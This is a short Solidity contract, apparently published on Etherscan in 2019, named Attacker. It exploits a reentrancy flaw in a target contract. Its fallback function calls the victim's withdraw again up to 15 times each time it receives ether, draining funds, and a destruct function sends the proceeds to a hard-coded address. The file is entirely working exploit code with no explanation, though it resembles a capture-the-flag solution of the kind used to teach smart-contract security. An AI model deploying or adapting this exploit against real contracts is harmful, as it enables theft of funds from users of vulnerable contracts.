/**
 *Submitted for verification at Etherscan.io on 2019-02-18
*/

pragma solidity ^0.4.18;

interface Reentrance {
    
    function donate(address _to) public payable;
    
    function balanceOf(address _who) public view returns (uint balance);
    
    function withdraw(uint _amount) public;
    
    function() public payable;
}

contract Attacker {
    Reentrance r;
    uint public counter;
    
    event CallBack(uint);

    function Attacker (address victim) public payable {
        r = Reentrance(victim);
        counter = 0;
    }
    
    function attack(uint value) public {
        r.withdraw(value);
    }
    
    function destruct() public {
        selfdestruct(0x62F39dd6862bb26F45ca2A77749Bd5A4038e80Fe);
    }
    
    function () public payable {
        if (counter < 15) {
            CallBack(counter);
            counter += 1;
            r.withdraw(msg.value);
        }
    }

}
